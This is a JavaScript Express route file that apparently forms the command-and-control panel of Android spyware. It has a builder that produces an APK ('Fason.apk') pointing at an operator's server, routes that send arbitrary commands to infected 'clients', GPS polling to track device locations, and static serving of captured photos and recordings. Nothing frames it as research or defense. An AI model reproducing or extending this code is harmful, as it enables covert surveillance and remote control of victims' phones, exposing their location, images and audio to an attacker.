const express = require('express');
const path = require('path');
const fs = require('fs');
const config = require('../config/config');
const db = require('../database/db');
const clients = require('../clients/clients');
const { logger, getLogs, clearLogs, getStats: getLogStats } = require('../logs/logs');
const builder = require('../builder/builder');
const { auth, checkRateLimit, setupRoutes, startCleanup } = require('../auth/auth');

const router = express.Router();

// Request logging
router.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        if (req.path !== '/builder/progress' && !req.path.startsWith('/api/clients')) {
            logger.info(`${req.method} ${req.path} - ${res.statusCode} (${Date.now() - start}ms)`, 'http');
        }
    });
    next();
});

router.use(checkRateLimit);

// Auth routes
setupRoutes(router);
startCleanup();

// Dashboard
router.get('/', auth, (req, res) => {
    const online = clients.online();
    const offline = clients.offline();
    res.render('index', {
        online,
        offline,
        stats: { total: online.length + offline.length, online: online.length, offline: offline.length }
    });
});

// Builder page
router.get('/builder', auth, (req, res) => {
    res.render('builder');
});

// Build APK
router.post('/builder', auth, (req, res) => {
    const { serverUrl, homePageUrl } = req.body;

    if (!serverUrl) return res.json({ error: 'Server URL is required' });

    try {
        new URL(serverUrl.startsWith('http') ? serverUrl : `http://${serverUrl}`);
    } catch (e) {
        return res.json({ error: 'Invalid server URL' });
    }

    logger.buildStart(serverUrl);
    builder.buildApk(serverUrl, homePageUrl, (err) => {
        if (err) {
            logger.buildFailed(err);
            res.json({ error: err });
        } else {
            logger.buildSuccess(serverUrl);
            res.json({ success: true });
        }
    });
});

// Build progress
router.get('/builder/progress', auth, (req, res) => {
    res.json({ progress: builder.getProgress() });
});

// Logs page
router.get('/logs', auth, (req, res) => {
    const { type, category, search, limit } = req.query;
    const logs = getLogs({
        type,
        category,
        search,
        limit: limit ? Math.min(parseInt(limit), 1000) : 100
    });
    res.render('logs', { logs, stats: getLogStats(), filters: { type, category, search } });
});

// Clear logs
router.post('/logs/clear', auth, (req, res) => {
    clearLogs();
    res.json({ success: true });
});

// Log stats API
router.get('/api/logs/stats', auth, (req, res) => {
    res.json(getLogStats());
});

// Device pages
router.get('/device/:id', auth, (req, res) => {
    res.redirect(`/device/${req.params.id}/info`);
});

router.get('/device/:id/:page', auth, (req, res) => {
    const { id, page } = req.params;
    const client = clients.get(id);

    if (!client) {
        return res.render('device', { id, page: 'notfound', data: {}, client: null });
    }

    res.render('device', { id, page, data: clients.getData(id, page) || {}, client });
});

// Send command
router.post('/cmd/:id/:cmd', auth, (req, res) => {
    const { id, cmd } = req.params;
    const params = { ...req.query, ...req.body };

    clients.send(id, cmd, params, (err, msg) => {
        if (err) res.json({ error: err });
        else res.json({ success: true, message: msg });
    });
});

// GPS polling
router.post('/gps/:id/:interval', auth, (req, res) => {
    const { id, interval } = req.params;
    const int = parseInt(interval) || 0;

    if (int < 0 || int > 3600) {
        return res.json({ error: 'Interval must be 0-3600 seconds' });
    }

    res.json({ success: clients.setGps(id, int) });
});

// Client data API
router.get('/api/client/:id/:page', auth, (req, res) => {
    const data = clients.getData(req.params.id, req.params.page);
    res.json(data ? { success: true, data } : { error: 'Not found' });
});

// Clients list API
router.get('/api/clients', auth, (req, res) => {
    res.json({
        online: clients.online(),
        offline: clients.offline(),
        total: clients.all().length
    });
});

// Client info API
router.get('/api/client/:id', auth, (req, res) => {
    const client = clients.get(req.params.id);
    res.json(client || { error: 'Client not found' });
});

// Delete client API
router.delete('/api/client/:id', auth, (req, res) => {
    const id = req.params.id;
    db.main.get('clients').remove({ id }).write();

    const file = path.join(config.dbPath, 'clients', `${id}.json`);
    if (fs.existsSync(file)) fs.unlinkSync(file);

    res.json({ success: true });
});

// Server stats API
router.get('/api/stats', auth, (req, res) => {
    res.json({
        clients: {
            online: clients.online().length,
            offline: clients.offline().length,
            total: clients.all().length
        },
        logs: getLogStats(),
        uptime: process.uptime(),
        memory: process.memoryUsage()
    });
});

// Static file serving
router.use('/downloads', express.static(config.downloadsPath));
router.use('/photos', express.static(config.photosPath));
router.use('/recordings', express.static(config.recordingsPath));

// Download APK
router.get('/Fason.apk', (req, res) => {
    if (fs.existsSync(builder.signedApk)) {
        logger.info('APK downloaded', 'build');
        res.download(builder.signedApk, 'Fason.apk');
    } else {
        res.status(404).json({ error: 'APK not found. Build one first.' });
    }
});

// Error handler
router.use((err, req, res, next) => {
    logger.systemError('Route error', err);
    res.status(500).json({ error: 'Internal server error' });
});

module.exports = router;
